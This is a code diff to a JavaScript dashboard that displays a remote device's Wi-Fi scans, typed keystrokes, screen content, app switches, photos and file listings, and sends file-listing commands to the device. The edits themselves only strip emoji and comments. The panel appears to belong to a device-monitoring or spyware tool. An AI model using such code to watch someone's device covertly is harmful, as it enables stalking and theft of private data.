@@ -56,7 +56,7 @@ export function initializeDataFeedListeners(uid) {
         const c = document.getElementById('wifi-count'); if(c) c.textContent = nets.length;
         const f = document.getElementById('wifi-feed'); if(!f) return;
         let h = `<div class="feed-item" style="color:#00ff88;">Connected: <strong>${esc(d.current_ssid||'Not connected')}</strong> (RSSI: ${d.current_rssi||'--'})</div>`;
-        h += nets.slice(0,30).map(n=>{const b=n.signal_strength>-50?'':n.signal_strength>-70?'':'🔴';const l=n.is_secured?'🔒':'';return `<div class="feed-item">${b} ${l} <strong>${esc(n.ssid||'Hidden')}</strong> <small>${n.signal_strength}dBm • ${n.frequency}MHz</small></div>`;}).join('');
+        h += nets.slice(0,30).map(n=>{const b=n.signal_strength>-50?'':n.signal_strength>-70?'':'';const l=n.is_secured?'🔒':'';return `<div class="feed-item">${b} ${l} <strong>${esc(n.ssid||'Hidden')}</strong> <small>${n.signal_strength}dBm • ${n.frequency}MHz</small></div>`;}).join('');
         f.innerHTML = h;
     });
 
@@ -135,7 +135,7 @@ export function initializeDataFeedListeners(uid) {
         }
 
         var display = merged.slice(0, 80);
-        var html = '<div class="feed-item" style="color:#00ff88;font-size:10px;">⌨️ ' + display.length + ' events — <span style="color:#4ecdc4;">⌨️ USER</span> typed · <span style="color:#ffd93d;">🖥️ DEVICE</span> screen · <span style="color:#ff6b6b;">📱 APP</span> switch · <span style="color:#a78bfa;">📝 CONTENT</span> full screen</div>';
+        var html = '<div class="feed-item" style="color:#00ff88;font-size:10px;">️ ' + display.length + ' events — <span style="color:#4ecdc4;">⌨️ USER</span> typed · <span style="color:#ffd93d;">🖥️ DEVICE</span> screen · <span style="color:#ff6b6b;">📱 APP</span> switch · <span style="color:#a78bfa;">📝 CONTENT</span> full screen</div>';
 
         display.forEach(function(k) {
             var icon, label, color, bgColor, borderColor;
@@ -144,7 +144,7 @@ export function initializeDataFeedListeners(uid) {
             } else if(k.event === 'screen_content') {
                 icon = ''; label = 'SCREEN'; color = '#a78bfa'; bgColor = 'rgba(167,139,250,0.08)'; borderColor = '#a78bfa';
             } else if(k.isSystem) {
-                icon = '🖥️'; label = 'DEVICE'; color = '#ffd93d'; bgColor = 'rgba(255,217,61,0.05)'; borderColor = '#ffd93d';
+                icon = '️'; label = 'DEVICE'; color = '#ffd93d'; bgColor = 'rgba(255,217,61,0.05)'; borderColor = '#ffd93d';
             } else {
                 icon = '⌨️'; label = 'USER'; color = '#4ecdc4'; bgColor = 'rgba(78,205,196,0.05)'; borderColor = '#4ecdc4';
             }
@@ -198,7 +198,7 @@ export function initializeDataFeedListeners(uid) {
         const p = d.photos||[]; 
         const f = document.getElementById('gallery-feed'); if(!f) return;
         if(d.status==='loading') {
-            let html = `<div class="feed-item" style="color:#ffaa00;">⏳ Loading thumbnails... ${d.total_read||0} photos processed</div>`;
+            let html = `<div class="feed-item" style="color:#ffaa00;"> Loading thumbnails... ${d.total_read||0} photos processed</div>`;
             html += p.slice(0,10).map(p => {
                 const thumb = p.thumbnail_url || '';
                 const imgHtml = thumb ? `<img src="${thumb}" style="width:100%;max-width:320px;border-radius:6px;margin-bottom:4px;" loading="lazy">` : `<div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:flex;align-items:center;justify-content:center;color:#555;font-size:10px;">Generating...</div>`;
@@ -259,14 +259,14 @@ export function initializeDataFeedListeners(uid) {
             o.innerHTML = html;
             return;
         }
-        let html = '<div style="color:#00ff88;font-size:13px;margin-bottom:4px;">📂 ' + esc(d.current_path||'/') + '</div>';
+        let html = '<div style="color:#00ff88;font-size:13px;margin-bottom:4px;"> ' + esc(d.current_path||'/') + '</div>';
         html += '<div style="color:#666;font-size:10px;margin-bottom:10px;">' + (d.total_dirs||0) + ' folders • ' + (d.total_files||0) + ' files</div>';
         var entries = d.entries || [];
         entries.forEach(function(e) {
             var pathEsc = e.path.replace(/'/g, "\\'").replace(/"/g, '&quot;');
             if(e.is_directory) {
                 html += '<div style="padding:6px 0;border-bottom:1px solid #111;cursor:pointer;" onclick="navigateToFile(\'' + pathEsc + '\')">';
-                html += '<div style="display:flex;align-items:center;gap:8px;"><span style="font-size:18px;">📁</span><div style="flex:1;min-width:0;"><div style="color:#ffd93d;font-size:12px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">' + esc(e.name) + '</div></div></div></div>';
+                html += '<div style="display:flex;align-items:center;gap:8px;"><span style="font-size:18px;"></span><div style="flex:1;min-width:0;"><div style="color:#ffd93d;font-size:12px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">' + esc(e.name) + '</div></div></div></div>';
             } else {
                 html += '<div style="padding:6px 0;border-bottom:1px solid #111;display:flex;gap:10px;align-items:center;">';
                 html += '<div style="width:50px;height:50px;background:#1a1a2e;border-radius:4px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:22px;">' + (e.icon||'') + '</div>';
@@ -319,8 +319,6 @@ function listenToFeed(uid, path, cb) {
 // Global helpers for dynamically injected HTML
 window.navigateToFile = function(path) {
     import('./command-handler.js').then(m => {
-        // We need to get currentUid somehow - let's use a global for now or pass it
-        // For simplicity in this refactor, we'll use window.currentDeviceUid
         if(window.currentDeviceUid) m.sendCmd(window.currentDeviceUid, 'list_files', path.trim());
     });
     var o = document.getElementById('file-output');
